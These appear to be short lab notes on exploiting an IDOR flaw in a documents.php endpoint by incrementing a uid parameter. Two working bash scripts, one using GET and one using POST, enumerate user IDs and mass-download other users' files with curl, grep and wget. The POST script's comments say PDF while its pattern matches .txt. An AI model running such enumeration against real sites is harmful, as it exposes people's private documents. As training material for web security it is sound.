
URL - http://SERVER_IP:PORT/documents.php?uid=1

here we can increment the uid 

each users has links in the source like
```html
/documents/Invoice_2_08_2020.pdf
/documents/Report_2_12_2020.pdf
```

We can just write a bash script or use burp intruder, to fetch all the links and download the files
## GET
```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```

## POST

```bash
#!/bin/bash

url="http://94.237.52.235:48688/documents.php"

for i in {1..20}; do
    echo "---- Processing UID: $i ----"

    # POST request sending uid
    html=$(curl -s -X POST -d "uid=$i" "$url")

    if [[ -z "$html" ]]; then
        echo "[WARN] UID $i: Empty response or request failed"
        continue
    fi

    # Extract PDF links
    links=$(echo "$html" | grep -oP "/documents.*?\.txt")

    if [[ -z "$links" ]]; then
        echo "[INFO] UID $i: No PDF links found"
        continue
    fi

    echo "[INFO] UID $i: Found PDF links:"
    echo "$links"

    # Download each PDF
    for link in $links; do
        full_url="http://94.237.52.235:48688$link"
        echo "[DOWNLOADING] $full_url"

        if wget -q "$full_url"; then
            echo "[OK] Downloaded: $link"
        else
            echo "[ERROR] Failed: $link"
        fi
    done
done

echo "---- Done ----"
```

